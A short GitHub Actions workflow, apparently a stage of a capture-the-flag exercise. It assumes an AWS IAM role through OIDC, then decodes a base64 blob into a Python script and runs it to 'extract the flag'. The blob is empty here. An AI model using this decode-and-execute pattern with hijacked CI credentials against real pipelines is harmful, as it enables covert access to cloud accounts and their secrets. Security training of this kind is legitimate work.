name: Stage2-Extract-Flag

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  extract:
    runs-on: ubuntu-latest

    steps:
      - name: Configure AWS
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Extract flag
        shell: bash
        run: |
          set +e
          python3 -m pip install boto3 requests requests-aws4auth --quiet

          printf '%s' '' | base64 --decode > /tmp/extract.py

          python3 /tmp/extract.py
